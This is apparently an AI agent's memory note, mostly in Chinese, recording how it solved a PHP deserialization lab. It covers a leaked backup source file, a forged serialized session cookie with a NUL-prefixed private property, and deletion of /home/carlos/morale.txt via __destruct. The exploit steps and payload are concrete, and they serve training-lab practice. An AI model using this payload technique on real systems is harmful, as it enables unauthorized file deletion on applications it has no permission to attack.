---
metadata:
  node_type: memory
name: "PRS arm A lab-deserialization-arbitrary-object-injection-in-php"
description: "arm A baseline:lab-deserialization-arbitrary-object-injection-in-php 冷实例一次通过 - 首页注释泄 /libs/CustomTemplate.php~ 取类源(session cookie 反序列化 + __destruct unlink lock_file_path),phpser 造 NUL 私有属性名载荷注入 session 即 solved"
last_updated: 2026-10-09T09:45:54+08:00
created: 2026-10-09T09:45:54+08:00
---

### arm A 基线(lab-deserialization-arbitrary-object-injection-in-php)

- 实例:冷实例 reused:false;range_launch launch-url 直吃 canonical 路径一次成功。
- 侦察:`GET /` 首页 HTML 注释 `<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->` 点名 PHP 源文件;`GET /libs/CustomTemplate.php~`(波浪号备份)直接回 source(1130B,text/plain)。
- 类源要点:`class CustomTemplate { private $template_file_path; private $lock_file_path; ... function __destruct() { if (file_exists($this->lock_file_path)) unlink($this->lock_file_path); } }` ⇒ 反序列化注入该对象即任意文件删除。
- 会话面:`POST /login` (wiener:peter,无 csrf 字段) 302 → Set-Cookie `session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpMG51OHNvcGlyOW1najl0a2gwNHVtM2UweWJ4ZnFrcSI7fQ%3d%3d` = base64(`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";}`)。
- 载荷:`O:14:"CustomTemplate":1:{s:30:"%00CustomTemplate%00lock_file_path";s:23:"/home/carlos/morale.txt";}` 交给 `phpser`,%00 展开成 NUL 私有属性前缀,输出 base64 == urlencoded cookie_value(`...%3D`)。
- 投递:http_dump 带 `--header 'Cookie: session=<raw base64（保留 = 填充）>'` `GET /` → 状态 500(应用按 User 语义取会话字段而崩),但析构在 shutdown 仍执行。
- 判据:banner_verdict 回 `solved:true` + `<h4>Congratulations, you solved the lab!</h4>`。
- 坑:500 是预期副作用、不是失败信号;别因 500 重试或怀疑载荷,直接读 banner 定生死。
- 件:range_launch / http_session / http_dump / phpser / banner_verdict,无需新件。

